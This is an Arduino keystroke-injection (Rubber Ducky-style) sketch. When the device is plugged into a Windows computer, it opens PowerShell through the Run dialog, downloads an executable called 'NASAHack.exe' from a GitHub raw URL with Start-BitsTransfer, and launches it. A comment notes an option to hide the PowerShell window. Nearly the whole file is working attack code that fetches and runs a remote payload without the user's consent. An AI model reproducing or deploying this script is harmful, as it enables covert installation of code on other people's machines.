#include <Keyboard.h>
#define KEY_ENTER 176 
int a=0;

void setup() {
  Keyboard.begin();
}

void singleKeyPress(int key){
  Keyboard.press(key);
  Keyboard.release(key);
}

void doubleKeyPress(int key1, int key2){
  Keyboard.press(key1);
  Keyboard.press(key2);
  Keyboard.release(key1);
  Keyboard.release(key2);
}

void commandInput(char *input){
  Keyboard.print(input);
  singleKeyPress(KEY_ENTER);
}

void startProgram(char *program){
  doubleKeyPress(KEY_LEFT_GUI, 'r');
  delay(500);
  Keyboard.print(program);
  singleKeyPress(KEY_ENTER);
}
void loop() {
  delay(1000);
  while(a==0){
    startProgram("powershell"); // -windowstyle hidden
    delay(500);
    doubleKeyPress(KEY_LEFT_ALT, KEY_ENTER);
    commandInput("$url = \"https://github.com/roian6/ArduinoDuckyTest/blob/master/NASAHack.exe?raw=true\"");
    commandInput("$output = \"Desktop\\NASAHack.exe\"");
    commandInput("$start_time = Get-Date");
    commandInput("Import-Module BitsTransfer");
    commandInput("Start-BitsTransfer -Source $url -Destination $output");
    commandInput("start Desktop\\NASAHack.exe");
    commandInput("exit");
    
//    startProgram("cmd");
//    delay(500);
//    doubleKeyPress(KEY_LEFT_ALT, KEY_ENTER);
//    commandInput("color a");
//    commandInput("tree");

    a++;
  }
  
}
